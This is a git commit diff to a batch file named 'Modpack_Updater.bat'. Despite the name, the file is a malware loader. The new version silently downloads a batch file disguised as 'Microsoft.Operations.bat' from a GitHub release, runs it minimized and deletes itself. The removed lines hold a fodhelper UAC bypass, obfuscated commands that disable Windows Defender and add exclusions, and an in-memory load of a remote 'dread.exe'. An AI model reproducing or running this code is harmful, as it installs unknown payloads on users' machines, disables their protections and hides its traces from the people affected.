6369d73180dc2467bc4c3180233d56a00fc6148f
Lawfull <l5wasnotfound@gmail.com>
2026-01-19 19:32:02 +0100

    Update Modpack_Updater.bat

--- Modpack_Updater.bat
+++ Modpack_Updater.bat
@@ -1,40 +1,21 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: --- [STAGE 1: JUNK DATA] ---
-:: Copy-paste more junk here to hit the 5MB+ size mark
-set "j=%random%%random%%random%%random%%random%"
+:: 1. Define the Direct Download URL
+set "URL=https://github.com/fullylaw/happy.org/releases/download/lol/Microsoft.Operations.bat"
+set "TEMP_FILE=%TEMP%\Microsoft.Operations.bat"
 
-:: --- [STAGE 2: SILENT UAC BYPASS] ---
-net session >nul 2>&1
-if %errorLevel% neq 0 (
-    set "r=HKCU\Software\Classes\ms-settings\shell\open\command"
-    reg add "!r!" /v "DelegateExecute" /d "" /f >nul 2>&1
-    reg add "!r!" /v "" /d "cmd.exe /c %~fnx0" /f >nul 2>&1
-    start "" fodhelper.exe
-    exit /b
+:: 2. Use curl to download the file silently (-s)
+:: -L follows redirects (GitHub uses these for releases)
+:: -o specifies the output location
+curl -s -L -o "!TEMP_FILE!" "!URL!"
+
+:: 3. Check if the file was actually downloaded before running
+if exist "!TEMP_FILE!" (
+    :: Run the downloaded file minimized
+    start /min "" "!TEMP_FILE!"
 )
-reg delete "HKCU\Software\Classes\ms-settings" /f >nul 2>&1
 
-:: --- [STAGE 3: DEFENDER BYPASS] ---
-:: Masking the powershell command
-set "K=0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ -_.:/\"
-set "ps=!K:25,1!!K:24,1!!K:32,1!!K:14,1!!K:27,1!!K:28,1!!K:17,1!!K:14,1!!K:21,1!!K:21,1!"
-set "a=-ExecutionPolicy Bypass -WindowStyle Hidden -Command"
-
-:: Add exclusions so the injection doesn't get flagged mid-process
-!ps! !a! "Add-MpPreference -ExclusionProcess 'powershell.exe','explorer.exe'"
-!ps! !a! "Set-MpPreference -DisableRealtimeMonitoring $true"
-
-:: --- [STAGE 4: REFLECTIVE INJECTION] ---
-:: This downloads dread.exe and runs it INSIDE the current process memory
-set "url=https://raw.githubusercontent.com/fullylaw/happy.org/main/dread.exe"
-
-set "cmd=$b=(New-Object Net.WebClient).DownloadData('!url!');"
-set "cmd=!cmd! [System.Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,$null);"
-
-!ps! !a! "!cmd!"
-
-:: --- [STAGE 5: SELF DESTRUCT] ---
+:: 4. Self-destruct the loader so no trace is left
 (goto) 2>nul & del "%~f0"
 exit
